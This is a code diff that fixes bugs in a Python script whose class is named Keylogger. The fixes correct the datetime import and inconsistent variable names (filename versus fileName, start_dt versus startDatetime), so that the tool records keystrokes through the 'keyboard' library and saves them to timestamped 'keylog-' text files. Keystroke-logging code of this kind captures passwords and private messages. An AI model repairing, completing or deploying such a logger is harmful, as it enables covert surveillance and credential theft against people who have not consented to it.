@@ -1,4 +1,4 @@
-import datetime
+from datetime import datetime
 from threading import Timer
 import keyboard
 
@@ -44,7 +44,7 @@ class Keylogger:
 
             if self.reportMethod == "file":
                 self.reportToFile()
-            print(f"[{self.filename}] - {self.log}")
+            print(f"[{self.fileName}] - {self.log}")
             self.startDatetime = datetime.now()
         
         self.log = ""
@@ -57,9 +57,9 @@ class Keylogger:
             This method creates a log file in the current directory that contains
             the current keylogs in the `self.log` variable
         """
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(f"{self.fileName}.txt", "w") as f:
             print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        print(f"[+] Saved {self.fileName}.txt")
 
     def start(self):
         self.startDatetime = datetime.now()
@@ -76,8 +76,8 @@ class Keylogger:
         """
             Construct the filename to be identified by start & end datetimes
         """
-        startDatetimeString = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        endDatetimeString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        startDatetimeString = str(self.startDatetime)[:-7].replace(" ", "-").replace(":", "")
+        endDatetimeString = str(self.endDatetime)[:-7].replace(" ", "-").replace(":", "")
         self.fileName = f"keylog-{startDatetimeString}_{endDatetimeString}"
 
 if __name__ == "__main__":
